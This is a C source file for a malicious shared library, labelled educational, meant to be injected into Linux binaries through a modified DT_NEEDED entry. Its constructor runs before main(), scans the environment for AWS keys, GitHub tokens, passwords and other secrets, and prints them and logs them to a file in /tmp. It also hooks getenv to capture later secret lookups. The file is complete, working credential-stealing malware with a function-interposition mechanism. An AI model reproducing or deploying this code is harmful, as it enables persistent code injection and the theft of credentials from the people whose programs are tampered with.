/*
 * evil_needed.c - Malicious Library for DT_NEEDED Injection
 *
 * This library is designed to be injected via DT_NEEDED modification.
 * When the dynamic linker loads the binary, this library is loaded
 * automatically and its constructor runs BEFORE main().
 *
 * Attack capabilities:
 *   - Execute arbitrary code at program startup
 *   - Steal environment variables and secrets
 *   - Hook functions via symbol interposition
 *   - Persist across program restarts (in the binary)
 *
 * Compile:
 *   gcc -shared -fPIC -o libevil_needed.so evil_needed.c
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <pwd.h>
#include <time.h>

/* Color codes */
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

#define LOG_FILE "/tmp/dt_needed_injection.log"

/* ═══════════════════════════════════════════════════════════════════════════
 * LOGGING
 * ═══════════════════════════════════════════════════════════════════════════ */

static FILE *logfile = NULL;

static void init_log(void) {
    logfile = fopen(LOG_FILE, "a");
    if (logfile) {
        time_t now = time(NULL);
        fprintf(logfile, "\n════════════════════════════════════════════════════════\n");
        fprintf(logfile, "DT_NEEDED INJECTION - %s", ctime(&now));
        fprintf(logfile, "PID: %d, PPID: %d\n", getpid(), getppid());
        fprintf(logfile, "════════════════════════════════════════════════════════\n\n");
    }
}

static void log_event(const char *event) {
    if (logfile) {
        fprintf(logfile, "[+] %s\n", event);
        fflush(logfile);
    }
}

static void log_secret(const char *name, const char *value) {
    if (logfile) {
        fprintf(logfile, "[SECRET] %s = %s\n", name, value);
        fflush(logfile);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * CONSTRUCTOR - Runs BEFORE main()
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((constructor))
static void evil_init(void) {
    init_log();

    /* Display banner */
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "      ★ DT_NEEDED INJECTION PAYLOAD ACTIVATED ★                " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "                                                                " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  This library was loaded via DT_NEEDED modification!           " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Code executing BEFORE main() of the target program.           " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    log_event("Constructor called - executing before main()");

    /* Gather information about the process */
    fprintf(stderr, CYAN "  [*] Process Information:\n" RESET);
    fprintf(stderr, "      PID:  %d\n", getpid());
    fprintf(stderr, "      PPID: %d\n", getppid());

    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        fprintf(stderr, "      User: %s (UID: %d)\n", pw->pw_name, getuid());
        log_event(pw->pw_name);
    }

    /* Get the executable name */
    char exe[256] = {0};
    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (len > 0) {
        exe[len] = '\0';
        fprintf(stderr, "      Executable: %s\n", exe);

        char buf[512];
        snprintf(buf, sizeof(buf), "Injected into: %s", exe);
        log_event(buf);
    }

    fprintf(stderr, "\n");

    /* Steal sensitive environment variables */
    fprintf(stderr, CYAN "  [*] Scanning for secrets in environment...\n" RESET);

    const char *sensitive_vars[] = {
        "SECRET_API_KEY",
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "DATABASE_PASSWORD",
        "GITHUB_TOKEN",
        "API_KEY",
        "PASSWORD",
        "TOKEN",
        "PRIVATE_KEY",
        NULL
    };

    int found = 0;
    for (int i = 0; sensitive_vars[i]; i++) {
        char *value = getenv(sensitive_vars[i]);
        if (value) {
            fprintf(stderr, RED "      [CAPTURED] " RESET "%s = %s\n",
                    sensitive_vars[i], value);
            log_secret(sensitive_vars[i], value);
            found++;
        }
    }

    /* Also scan for anything containing KEY, SECRET, PASS, TOKEN */
    extern char **environ;
    for (char **env = environ; *env; env++) {
        if ((strstr(*env, "KEY=") || strstr(*env, "SECRET=") ||
             strstr(*env, "PASS=") || strstr(*env, "TOKEN=")) &&
            !strstr(*env, "GPG")) {  /* Skip GPG agent stuff */
            fprintf(stderr, RED "      [CAPTURED] " RESET "%s\n", *env);
            log_secret("ENV", *env);
            found++;
        }
    }

    if (found == 0) {
        fprintf(stderr, YELLOW "      No sensitive variables found\n" RESET);
    }

    fprintf(stderr, "\n");

    /* Show that we can hook functions */
    fprintf(stderr, CYAN "  [*] Function hooking capability:\n" RESET);
    fprintf(stderr, "      Since we're loaded via DT_NEEDED, we can provide\n");
    fprintf(stderr, "      symbol definitions that override libc functions.\n");
    fprintf(stderr, "      (See the intercepted getenv below)\n");
    fprintf(stderr, "\n");

    log_event("Initialization complete");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * FUNCTION HOOKS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Hook getenv to capture all environment variable lookups */
static char *(*real_getenv)(const char *) = NULL;

char *getenv(const char *name) {
    if (!real_getenv) {
        real_getenv = dlsym(RTLD_NEXT, "getenv");
    }

    char *value = real_getenv(name);

    /* Log interesting lookups */
    if (value && (strstr(name, "KEY") || strstr(name, "SECRET") ||
                  strstr(name, "PASS") || strstr(name, "TOKEN"))) {
        fprintf(stderr, RED "[DT_NEEDED HOOK] " MAGENTA "getenv(\"%s\") = \"%s\"\n" RESET,
                name, value);
        log_secret(name, value);
    }

    return value;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * DESTRUCTOR
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor))
static void evil_fini(void) {
    log_event("Destructor called - program exiting");

    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "      ★ DT_NEEDED INJECTION SESSION COMPLETE ★                  " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Log saved to: " BLUE LOG_FILE RESET "                  " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    if (logfile) {
        fprintf(logfile, "\n[+] Session ended\n");
        fclose(logfile);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * EXPORTED FUNCTION (optional - for library identification)
 * ═══════════════════════════════════════════════════════════════════════════ */

const char *evil_needed_version(void) {
    return "DT_NEEDED Injection Library v1.0";
}
